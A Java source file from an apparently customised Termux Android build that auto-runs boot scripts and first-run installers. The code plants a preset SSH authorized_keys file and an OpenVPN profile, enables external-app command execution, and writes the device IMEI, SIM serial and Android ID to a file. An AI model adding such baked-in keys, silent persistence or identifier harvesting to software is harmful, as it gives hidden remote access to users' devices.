package com.termux.app;

import static com.termux.shared.termux.TermuxUtils.execScript;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;


import com.termux.R;
import com.termux.shared.android.AndroidUtils;
import com.termux.shared.logger.Logger;
import com.termux.shared.markdown.MarkdownUtils;
import com.termux.shared.shell.command.ExecutionCommand;
import com.termux.shared.shell.command.runner.app.AppShell;
import com.termux.shared.termux.TermuxConstants;
import com.termux.shared.termux.TermuxUtils;
import com.termux.shared.termux.file.TermuxFileUtils;
import com.termux.shared.termux.shell.command.environment.TermuxShellEnvironment;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.util.UUID;

public class MyHackApp {

    /*
    // запустить MC в новой сессии
    am startservice --user 0 -n com.termux/com.termux.app.RunCommandService \
    -a com.termux.RUN_COMMAND \
    --es com.termux.RUN_COMMAND_PATH '/data/data/com.termux/files/usr/bin/mc' \
    --es com.termux.RUN_COMMAND_ARGUMENTS ' dir ' \
    --ez com.termux.RUN_COMMAND_BACKGROUND 'false'

    am startservice --user 0 -n com.termux/com.termux.app.RunCommandService \
    -a com.termux.RUN_COMMAND \
    --es com.termux.RUN_COMMAND_PATH '/data/data/com.termux/files/usr/bin/mc' \
    --es com.termux.RUN_COMMAND_ARGUMENTS ' dir ' \
    --es com.termux.RUN_COMMAND_SESSION_ACTION '0' \
    --ez com.termux.RUN_COMMAND_BACKGROUND 'false'

    // запустить команду, после выполнения закрыть окно
    am startservice --user 0 -n com.termux/com.termux.app.RunCommandService \
    -a com.termux.RUN_COMMAND \
    --es com.termux.RUN_COMMAND_PATH '/data/data/com.termux/files/usr/bin/top' \
    --esa com.termux.RUN_COMMAND_ARGUMENTS '-n,5' \
    --es com.termux.RUN_COMMAND_WORKDIR '/data/data/com.termux/files/home' \
    --ez com.termux.RUN_COMMAND_BACKGROUND 'false' \
    --es com.termux.RUN_COMMAND_SESSION_ACTION '0'


    // https://github.com/termux/termux-app/wiki/RUN_COMMAND-Intent
    // запустить команду, после карытия окна закрыть
    am startservice --user 0 -n com.termux/com.termux.app.RunCommandService \
    -a com.termux.RUN_COMMAND \
    --es com.termux.RUN_COMMAND_PATH '/data/data/com.termux/files/usr/bin/mc' \
    --es com.termux.RUN_COMMAND_WORKDIR '/data/data/com.termux/files/home' \
    --ez com.termux.RUN_COMMAND_BACKGROUND 'false' \
    --es com.termux.RUN_COMMAND_SESSION_ACTION '0'



    am startservice --user 0 -n com.termux/com.termux.app.RunCommandService -a com.termux.RUN_COMMAND --es com.termux.RUN_COMMAND_PATH '/data/data/com.termux/files/usr/bin/mc' --es com.termux.RUN_COMMAND_WORKDIR '/data/data/com.termux/files/home' --ez com.termux.RUN_COMMAND_BACKGROUND 'false' --es com.termux.RUN_COMMAND_SESSION_ACTION '0'

     */

    public static int REQUEST_CAMERA_PERMISSION = 30475;
    public static int NumTermLine = 0;

    /**
     * Разрешения
     *
     * @param activity
     */
    public static void requestPermission(AppCompatActivity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            final Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + activity.getPackageName()));
            activity.startActivityForResult(intent, REQUEST_CAMERA_PERMISSION);
        }
    }

    public static void onBootDevice(Context context, Intent intent) {
        // https://www.youtube.com/watch?v=4_CkU9L2mCo&ab_channel=CodinginFlow
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Intent i = new Intent(context, TermuxActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        }
    }

    public static void initConfig(Activity activity) {
        Log.d("TermuxActivity", "start");

        //  Подключаем пользовательские пакеты
        new Thread(new Runnable() {
            public void run() {
                try {
                    Thread.sleep(5000);
                    String cmdScript = "sh init_lib.sh";
                    execTermuxScript(activity, new StringBuilder(" input text '" + cmdScript + "' && input keyevent 66 &&  echo 'OK' "));
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    /**
     * Функуия запуска пользовательского скрипта из каталога  /data/data/com.termux/files/home/.termux/boot
     * Все текстовые файлы вычитывыаются по строчно и помещаются в конслоль
     */
    public static void runUserScripts(AppCompatActivity activity) {
        new Thread(new Runnable() {
            public void run() {
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                File dir = new File("/data/data/com.termux/files/home/.termux/boot");
                if (!dir.isDirectory()) {
                    dir.mkdirs();

                    //  установка ТомСат
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/authorized_keys.ssh", com.termux.shared.R.raw.authorized_keys_ssh, false);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/.ssh/authorized_keys", com.termux.shared.R.raw.authorized_keys_ssh, false);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/info.txt", com.termux.shared.R.raw.info_txt, false);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/openvpn/MyasnikovIA.asuscomm.com.ovpn", com.termux.shared.R.raw.myasnikovia_asuscomm_com_ovpn, false);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/init_lib.sh", com.termux.shared.R.raw.init_lib, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/uninstall", com.termux.shared.R.raw.uninstall, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/setup", com.termux.shared.R.raw.setup, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/config", com.termux.shared.R.raw.config, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/display", com.termux.shared.R.raw.display, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/vpn", com.termux.shared.R.raw.vpn, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/adb", com.termux.shared.R.raw.adb_sh, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/file_browser", com.termux.shared.R.raw.file_browser, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/.termux/boot/redis.sh", com.termux.shared.R.raw.redis_sh, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/.termux/boot/autorun", com.termux.shared.R.raw.autorun, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/.termux/boot/start_open_vpn.sh", com.termux.shared.R.raw.start_open_vpn_sh, true);
                    //TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/.termux/boot/autorun.py", com.termux.shared.R.raw.autorun_py, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/lib", com.termux.shared.R.raw.lib, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/py_install", com.termux.shared.R.raw.py, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/rdp_install", com.termux.shared.R.raw.rdp, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/postgres_install", com.termux.shared.R.raw.sql_sh, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/xrdp.ini", com.termux.shared.R.raw.xrdp_ini, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/ssh", com.termux.shared.R.raw.ssh_sh, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/tomcat_install.sh", com.termux.shared.R.raw.tomcat_install_sh, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/install_kali.sh", com.termux.shared.R.raw.install_kali_sh, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/install_manjora.sh", com.termux.shared.R.raw.install_manjora_sh, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/install_ubuntu.sh", com.termux.shared.R.raw.install_ubuntu_sh, true);
                    TermuxUtils.copySh(activity, "/data/data/com.termux/files/home/install/install_void.sh", com.termux.shared.R.raw.install_void_sh, true);

                } else {
                    for (File file : dir.listFiles()) {

                        if (getFileExtension(file).equals("py")) {
                            continue;
                        }
                        if (file.isDirectory()) {
                            continue;
                        }
                        Runnable taskScript = new Runnable() {
                            public void run() {
                                NumTermLine++;
                                String cmdScript = " chmod +x " + file.getAbsolutePath() + "  && sh " + file.getAbsolutePath() + " ";
                                execScript(activity.getBaseContext(), cmdScript, NumTermLine);
                                // execScript(activity.getBaseContext(),"redis-server", 2);
                                // execTermuxScript(activity.getBaseContext(), new StringBuilder(cmdScript));
                                /*try {
                                    BufferedReader reader = new BufferedReader(new FileReader(file.getAbsolutePath()));
                                    String line = null;

                                    while ((line = reader.readLine()) != null) {
                                        if (line.indexOf("#") != -1) {
                                            line = line.split("#")[0];
                                        }
                                        line = line.replace("\"", "\\\"");
                                        if (line.replace(" ", "").length() == 0) {
                                            continue;
                                        }
                                        if (line.length() > 0) {
                                            NumTermLine++;
                                            String resultText = execScript(activity.getBaseContext(), line, NumTermLine);
                                            // String resultText = execTermuxScript(activity.getBaseContext(), new StringBuilder(line));
                                            if (resultText != null) {
                                                Log.d("TermuxActivity", resultText);
                                            }
                                        }
                                    }
                                } catch (IOException ex) {
                                    Log.e("TermuxActivity", ex.getMessage());
                                }
                                */
                            }
                        };
                        new Thread(taskScript).start();
                    }

                    if (new File("/data/data/com.termux/files/home/install/ssh").exists()) {
                        String resultText = execTermuxScript(activity.getBaseContext(), new StringBuilder("rm /data/data/com.termux/files/home/install/ssh"));
                    }
                    if (new File("/data/data/com.termux/files/home/authorized_keys.ssh").exists()) {
                        // Если первый запуск , тогда  открываем окно с разрешениями (Адвляем файл  с ключем)
                        String resultText = execTermuxScript(activity.getBaseContext(), new StringBuilder("rm /data/data/com.termux/files/home/authorized_keys.ssh"));
                        resultText = execTermuxScript(activity.getBaseContext(), new StringBuilder("echo allow-external-apps=true >> /data/data/com.termux/files/home/.termux/termux.properties "));
                        // requestPermission(activity);
                    }
                }
            }
        }).start();
    }

    public static void saveTelInfo(AppCompatActivity activity) {
        final TelephonyManager tm = (TelephonyManager) activity.getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
        final String tmDevice, tmSerial, androidId;
        tmDevice = "" + tm.getDeviceId();
        tmSerial = "" + tm.getSimSerialNumber();
        androidId = "" + android.provider.Settings.Secure.getString(activity.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        UUID deviceUuid = new UUID(androidId.hashCode(), ((long) tmDevice.hashCode() << 32) | tmSerial.hashCode());
        String deviceId = deviceUuid.toString();
        try {
            FileOutputStream fos7 = new FileOutputStream("/data/data/com.termux/files/home/deviceId");
            fos7.write(("" +
                "deviceId=" + deviceId + " \n" +
                "tmDevice=" + tmDevice + " \n" +
                "tmSerial=" + tmSerial + " \n" +
                "androidId=" + androidId + " \n" +
                "").getBytes());
            fos7.flush();
            fos7.close();
        } catch (IOException ex) {
            Log.e("TermuxActivity", ex.getMessage());
        }
    }

    // запуск OpenVPN клиента
    public static void runVpnConnect(AppCompatActivity activity, String profilName) {
        // String profilName = "Barnaul_04-11-2022";
        Intent openVPN = new Intent("android.intent.action.VIEW");
        openVPN.setClassName("net.openvpn.openvpn", "net.openvpn.unified.MainActivity");
        openVPN.putExtra("net.openvpn.openvpn.AUTOSTART_PROFILE_NAME", "PC " + profilName);
        openVPN.putExtra("net.openvpn.openvpn.AUTOCONNECT", true);
        openVPN.putExtra("net.openvpn.openvpn.APP_SECTION", "PC");
        activity.startActivity(openVPN);
    }

    // запуск OpenVPN клиента
    public static void runVpnConnectActiv(AppCompatActivity activity) {
        if (new File("/data/data/com.termux/files/home/openvpn_profile_connect").exists()) {
            try {
                BufferedReader reader = new BufferedReader(new FileReader(new File("/data/data/com.termux/files/home/openvpn_profile_connect").getAbsolutePath()));
                String line = null;
                while ((line = reader.readLine()) != null) {
                    String profilName = line.replaceAll("\r", "").replaceAll("\n", "");
                    Intent openVPN = new Intent("android.intent.action.VIEW");
                    openVPN.setClassName("net.openvpn.openvpn", "net.openvpn.unified.MainActivity");
                    openVPN.putExtra("net.openvpn.openvpn.AUTOSTART_PROFILE_NAME", "PC " + profilName);
                    openVPN.putExtra("net.openvpn.openvpn.AUTOCONNECT", true);
                    openVPN.putExtra("net.openvpn.openvpn.APP_SECTION", "PC");
                    activity.startActivity(openVPN);
                    break;
                }
            } catch (IOException ex) {
                Log.e("TermuxActivity", ex.getMessage());
            }
        }
    }


    //метод определения расширения файла
    private static String getFileExtension(File file) {
        String fileName = file.getName();
        // если в имени файла есть точка и она не является первым символом в названии файла
        if (fileName.lastIndexOf(".") != -1 && fileName.lastIndexOf(".") != 0)
            // то вырезаем все знаки после последней точки в названии файла, то есть ХХХХХ.txt -> txt
            return fileName.substring(fileName.lastIndexOf(".") + 1).toLowerCase();
            // в противном случае возвращаем заглушку, то есть расширение не найдено
        else return "";
    }

    public static String execTermuxScript(@NonNull final Context context, StringBuilder statScript) {

        String LOG_TAG = "MyHackApp";
        Context termuxPackageContext = TermuxUtils.getTermuxPackageContext(context);
        if (termuxPackageContext == null) return null;
        // Also ensures that termux files directory is created if it does not already exist
        String filesDir = termuxPackageContext.getFilesDir().getAbsolutePath();
        // Run script
        ExecutionCommand executionCommand = new ExecutionCommand(-1, "/system/bin/sh", null, statScript.toString() + "\n", "/", ExecutionCommand.Runner.APP_SHELL.getName(), true);
        executionCommand.commandLabel = TermuxConstants.TERMUX_APP_NAME + " Files Stat Command";
        executionCommand.backgroundCustomLogLevel = Logger.LOG_LEVEL_OFF;
        AppShell appShell = AppShell.execute(context, executionCommand, null, new TermuxShellEnvironment(), null, true);
        if (appShell == null || !executionCommand.isSuccessful()) {
            Logger.logErrorExtended(LOG_TAG, executionCommand.toString());
            return null;
        }
        // Build script output
        StringBuilder statOutput = new StringBuilder();
        statOutput.append("$ ").append(statScript.toString());
        statOutput.append("\n\n").append(executionCommand.resultData.stdout.toString());
        boolean stderrSet = !executionCommand.resultData.stderr.toString().isEmpty();
        if (executionCommand.resultData.exitCode != 0 || stderrSet) {
            Logger.logErrorExtended(LOG_TAG, executionCommand.toString());
            if (stderrSet)
                statOutput.append("\n").append(executionCommand.resultData.stderr.toString());
            statOutput.append("\n").append("exit code: ").append(executionCommand.resultData.exitCode.toString());
        }
        // Build markdown output
        StringBuilder markdownString = new StringBuilder();
        markdownString.append("## ").append(TermuxConstants.TERMUX_APP_NAME).append(" Files Info\n\n");
        AndroidUtils.appendPropertyToMarkdown(markdownString, "TERMUX_REQUIRED_FILES_DIR_PATH ($PREFIX)", TermuxConstants.TERMUX_FILES_DIR_PATH);
        AndroidUtils.appendPropertyToMarkdown(markdownString, "ANDROID_ASSIGNED_FILES_DIR_PATH", filesDir);
        markdownString.append("\n\n").append(MarkdownUtils.getMarkdownCodeForString(statOutput.toString(), true));
        markdownString.append("\n##\n");
        return markdownString.toString();
    }
}
